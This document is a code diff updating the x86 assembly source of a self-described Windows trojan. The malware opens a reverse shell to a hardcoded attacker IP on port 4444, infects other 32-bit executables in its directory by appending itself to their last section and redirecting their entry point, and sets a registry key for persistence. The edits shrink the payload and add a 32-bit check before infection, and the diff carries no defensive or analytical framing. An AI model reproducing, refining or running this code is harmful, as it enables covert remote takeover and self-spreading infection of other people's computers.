@@ -1,12 +1,13 @@
 ;--------------------------------------------------------------------------------------------------------------------;
 ; Author: Bach Ngoc Hung (hung.bachngoc@gmail.com)
 ; Compatible: Windows PE file 32 bits
-; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 166)
+; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 168)
 ; Version: 2.0
 ; This trojan capable of creating backdoor using reverse shell, injecting it self to other PE file.
 ; It can also add itself to the registry key for persistence.
 ; The injected file can also infect other files in the directory while avoiding inject to the infected files.
 ; This program uses API hashing to get function addresses, referenced from Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com).
+; Size: 1183 bytes
 ;--------------------------------------------------------------------------------------------------------------------;
 
 .386
@@ -20,13 +21,15 @@ payload:
 get_eip:
 	Pop Ebx
 	delta = $ -payload
+	Xor Ecx, Ecx
 	Inc Ebx
-	Sub Ebx, delta				; Point ebx back to the entry point of the payload
+	Sub Bl, delta					; Point ebx back to the entry point of the payload
 
-	Sub Esp, 400H
+	Mov Ch, 4H
+	Sub Esp, Ecx
 	Xor Eax, Eax
 	Lea Edi, [Ebp - 4H]
-	Mov Ecx, 100H
+	Mov Ch, 100H
 	Std
 	Rep Stosd
 	Cld
@@ -131,15 +134,16 @@ reverse_shell:
 	Mov [Ebp - 108H], Ebx				; This holds the address of the beginning of the payload
 
 	; Load ws2_32.dll library
-	Push 3233H
+	Mov Cx, 3233H
+	Push Ecx
 	Push 5F327377H
 	Push Esp
 	Push 0726774CH 					; hash('kernel32.dll', 'LoadLibraryA')
 	Call hash_api
 
 	; System call: WSAStartup
-	Mov Eax, 190H
-	Sub Esp, Eax					; Creating space for WSAData
+	Mov Cx, 190H
+	Sub Esp, Ecx					; Creating space for WSAData
 	Push Esp					; lpWSAData
 	Push Eax
 	Push 6B8029H					; hash('ws2_32.dll', 'WSAStartup')
@@ -162,16 +166,11 @@ reverse_shell:
 	; connect(SOCKET s, const addr *name, int namelen)
 	; listen on port 4444 (0x5C11), IPv4 set to AF_INET (0x0002) => 5C110002
 	; listen on all interfaces
-	Mov Eax, 0740A8C0H 				; 192.168.64.7
-	Push Eax
+	Push 0740A8C0H 					; 192.168.64.7
 	Mov Eax, 5C110102H
 	Dec Ah						; 5C110102 => 5C110002 (Remove 01)
-	Push Eax
-	Mov Esi, Esp
-	Xor Eax, Eax
-	Mov Ax, 10H
 	Push Eax					; namelen = 16 bytes
-	Push Esi					; *name: 5C110002
+	Push Esp					; *name: 5C110002
 	Push Edi					; Arg 1(s): WSASocketA() Handler
 	Push 6174A599H					; hash("ws2_32.dll", "connect")
 	Call hash_api
@@ -250,7 +249,10 @@ SetRegistryKey:
 	Push 2H						; samDesired = KEY_SET_VALUE
 	Push Ecx					; ulOptions = NULL
 	Push Edx					; lpSubkey
-	Push 80000001H					; hKey = HKEY_CURRENT_USER
+	Mov Ch, 80H
+	Shl Ecx, 16
+	Mov Cl, 1H					; ecx = 0x80000001
+	Push Ecx					; hKey = HKEY_CURRENT_USER
 	Push 3E9E3F88H					; hash ("Advapi32.dll", 'RegOpenKeyExA')
 	Call hash_api
 	Mov Edi, [Ebp - 10H]
@@ -293,6 +295,7 @@ SetRegistryKey:
 	Call hash_api					; Call RegCloseKey
 	Lea Edi, [Ebp - 150H]
 
+; Copy the path from [ebp - 200H] to [ebp - 150H]
 copy_loop:
 	Lodsb
 	Stosb
@@ -328,7 +331,7 @@ copy_loop:
 process_files_loop:
 	; Cut the name of the exe file returned from FindFirstFileA
 	; And append it to the current directory using lstrcatA => path to the exe file
-	Lea Eax, [Ebp - 400H + 2CH]	; cFileName
+	Lea Eax, [Ebp - 400H + 2CH]			; cFileName
 	Push Eax					; [in] lpString2 : Name of the exe file
 	Lea Eax, [Ebp - 200H]
 	Push Eax					; [in, out] lpString1 : This will hold the address of the file for injection
@@ -396,7 +399,9 @@ InjectingFile:
 	Push 3H						; dwCreationDisposition (OPEN_EXISTING)
 	Push Ecx					; lpSecurityAttributes (NULL)
 	Push 1H						; dwShareMode (FILE_SHARE_READ)
-	Push 0C0000000H					; dwDesiredAccess (GENERIC_WRITE or GENERIC_READ)
+	Mov Ch, 0C0H
+	Shl Ecx, 16					; ecx = 0x0C0000000
+	Push Ecx					; dwDesiredAccess (GENERIC_WRITE or GENERIC_READ)
 	Push Eax					; lpFilePath
 	Push 4FDAF6DAH					; hash("kernel32.dll", "CreateFileA")
 	Call hash_api
@@ -444,6 +449,10 @@ InjectingFile:
 	Mov Edi, [Ebx + 3CH]
 	Add Edi, Ebx					; PE signature
 
+	Mov Eax, [Edi + 4H]		
+	Cmp Eax, 14CH					; Check if the file is 32 bit executable or not
+	Jne infect_next_file
+
 	Mov Eax, [Edi + 3CH]
 	Mov [Ebp - 64H], Eax				; FileAlignment
 
@@ -461,10 +470,11 @@ InjectingFile:
 	Mov [Ebp - 60H], Eax				; SizeOfImage
 
 	Mov Ax, [Edi + 6H]				; Number of section
-	Add Edi, 0F8H					; Skip through Optional Header
-	Sub Ax, 1
-	Mov Dx, 40
-	IMul Ax, Dx
+	Mov Cl, 0F8H
+	Add Edi, Ecx					; Skip through Optional Header
+	Dec Ax
+	Mov Dl, 40
+	IMul Dl
 	Movzx Eax, Ax
 	Add Edi, Eax					; Move to the last section info in section table
 	Push Edi					; Save the current position in the section table for later use
@@ -477,8 +487,8 @@ InjectingFile:
 	Add Edx, Eax
 	Mov [Ebp - 70H], Edx				; Save the distance to move for the payload injection
 
-	Mov Edx, PayloadSize
-	Add Eax, Edx
+	Mov Cx, PayloadSize
+	Add Eax, Ecx
 	Mov [Edi + 8H], Eax
 	Push Eax					; Save new virtual size
 	Mov Esi, [Ebp - 4CH]				; esi = fileHandle
@@ -486,25 +496,27 @@ InjectingFile:
 	; Calculate new raw size of the last section
 	Mov Eax, [Edi + 10H]				; Move to last section raw size
 	Mov [Ebx + 38H], Eax				; Save RawSize for backup later
-	Mov Edx, PayloadSize
-	Add Eax, Edx
-	Mov Edx, [Ebp - 64H]				; FileAlignment
-	Dec Edx
-	Add Eax, Edx
-	Not Edx
-	And Eax, Edx
+	Add Eax, Ecx
+	Mov Ecx, [Ebp - 64H]				; FileAlignment
+	Dec Ecx
+	Add Eax, Ecx
+	Not Ecx
+	And Eax, Ecx
 	Mov [Edi + 10H], Eax				; Update new raw size of the last section
 
 	Mov Eax, [Edi + 24H]
 	Mov [Ebx + 28H], Eax				; Save the current Characteristics for backup later
-	Or Eax, 60000020H				; IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE
+	Mov Bh, 60H
+	Shl Ebx, 16
+	Mov Bl, 20H
+	Or Eax, Ebx					; IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE
 	Mov [Edi + 24H], Eax				; Update last section characteristics
 
 	; Calculate new AddressOfEntryPoint = VirtualAddress + VirtualSize - PayloadSize
 	Mov Eax, [Edi + 0CH]				; VirtualAdress
 	Pop Ecx						; VirtualSize
 	Add Eax, Ecx
-	Mov Ecx, PayloadSize
+	Mov Cx, PayloadSize
 	Sub Eax, Ecx
 
 	Mov Edi, [Ebp - 58H]				; Base address
@@ -513,14 +525,13 @@ InjectingFile:
 
 	; Calculate new SizeOfImage and roundit up with section alignment
 	Mov Eax, [Edi + 50H]				; eax = offset of SectionAlignment
-	Mov Edx, PayloadSize
 	Dec Eax
-	Add Edx, Eax
+	Add Ecx, Eax
 	Not Eax
-	And Edx, Eax
+	And Ecx, Eax
 	Mov Eax, [Ebp - 60H]				; eax = SizeOfImage
-	Add Edx, Eax
-	Mov [Edi + 50H], Edx				; Update new SizeOfImage
+	Add Ecx, Eax
+	Mov [Edi + 50H], Ecx				; Update new SizeOfImage
 	Pop Edi						; Restore the current position in the section table
 
 	; Injecting the payload
@@ -536,7 +547,7 @@ InjectingFile:
 	Lea Eax, [Ebp - 6CH]
 	Push Ebx					; lpOverlapped = NULL
 	Push Eax					; lpNumberOfBytesWritten
-	Mov Eax, PayloadSize
+	Mov Ax, PayloadSize
 	Push Eax
 	Mov Edx, [Ebp - 108H]				; Load payload base address to edx
 	Lea Eax, [Edx]					; Point eax to the beginning of the payload
